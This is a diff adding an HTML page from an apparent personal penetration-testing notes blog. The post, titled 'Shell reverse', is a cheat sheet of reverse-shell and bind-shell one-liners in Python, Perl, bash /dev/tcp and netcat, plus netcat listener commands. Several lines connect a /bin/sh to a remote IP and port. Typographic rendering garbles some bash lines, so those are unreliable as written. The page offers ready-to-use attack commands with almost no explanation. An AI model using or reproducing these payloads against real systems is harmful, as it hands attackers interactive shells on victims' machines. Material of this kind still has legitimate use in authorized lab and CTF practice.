@@ -1,0 +1,69 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Shell reverse // Pentest notes</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.52" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Przemek Sosnowski" />
+    <meta name="description" content="" />
+    <base href="https://example.com" />
+    <link rel="stylesheet" href="https://example.com/css/main.min.3bf813d46763420c83fb33c51950b4fc582483efcfddb34b4e4e8d6b811e3208.css" />
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="./avatar.jpg" /></a>
+      <h1>Pentest notes</h1>
+      <p>My pentest notes from HTB and other</p>
+      <div class="app-header-social">
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Shell reverse</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Dec 17, 2018
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          1 min read
+        </div><div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+          <a class="tag" href="https://example.com/tags/python/">Python</a><a class="tag" href="https://example.com/tags/bash/">Bash</a><a class="tag" href="https://example.com/tags/nc/">Nc</a><a class="tag" href="https://example.com/tags/netcat/">Netcat</a></div></div>
+    </header>
+    <div class="post-content">
+      <p><code><pre>
+python3 -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.10.10&rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;<br />
+perl -e &lsquo;use Socket;$i=&ldquo;10.10.10.10&rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;<br />
+nc -e /bin/sh 10.0.0.1 1234<br />
+</pre></code></p>
+
+<p>reverse
+<code><pre>
+bash -i &gt;&amp; /dev/tcp/192.168.100.<sup>113</sup>&frasl;<sub>443</sub> 0&gt;&amp;1<br />
+&rsquo;/bin/bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/192.168.122.<sup>1</sup>&frasl;<sub>2323</sub> 0&gt;&amp;1&rsquo;
+</pre></code></p>
+
+<p>listen
+<code><pre>
+nc -lvp 443<br />
+nc -lp 1&gt;/tmp/b
+</pre></code></p>
+
+<p>ipv6
+<code><pre>
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | \n\c -6 -l 6677 &gt; /tmp/f;
+nc -6 localhost 6677
+</pre></code></p>
+
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
